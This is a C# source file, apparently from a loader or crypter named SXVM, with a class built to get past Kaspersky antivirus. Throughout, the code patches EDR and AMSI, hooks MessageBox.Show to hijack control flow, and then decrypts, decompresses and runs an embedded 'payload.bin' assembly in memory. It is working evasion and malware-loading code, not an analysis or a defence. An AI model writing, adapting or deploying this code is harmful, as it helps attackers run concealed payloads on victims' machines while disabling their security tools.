using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static SXVM.API;
using static SXVM.Settings;

namespace SXVM.Bypasses
{
    internal static class Kaspersky
    {
        private static SXVM sxvm_kaspersky = new SXVM();

        private delegate void KasperskyBypass();

        private static string[] PassthroughArgs = null;

        internal static void Bypass(string[] args)
        {
            PatchEDR(false, true, false);
            HardwareBreakpointAmsiPatch.Bypass();
            KasperskyBypass kasperskyBypass = _KasperskyBypass;
            IntPtr KasperskyAddress = typeof(System.Windows.Forms.MessageBox).GetMethod("Show", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Static, null, new Type[] { typeof(string) }, null).MethodHandle.GetFunctionPointer();
            sxvm_kaspersky.Hook(KasperskyAddress, kasperskyBypass, true, false);
            PassthroughArgs = args;
            try
            {
                MessageBox.Show("A");
            }
            catch
            {
            }
        }

        private static void _KasperskyBypass()
        {
            sxvm_kaspersky.Unhook();
            Program.AttachHooks(null);
            MethodInfo mi = Assembly.Load(Decompress(AESDecrypt(ExtractResource(@"payload.bin"), DecryptionKey))).EntryPoint;
            ClearDecryptionKeyFromMemory();
            try
            {
                string[] args = PassthroughArgs;
                PassthroughArgs = null;
                mi.Invoke(null, new object[] { args });
            }
            catch
            {
                mi.Invoke(null, null);
            }
        }
    }
}
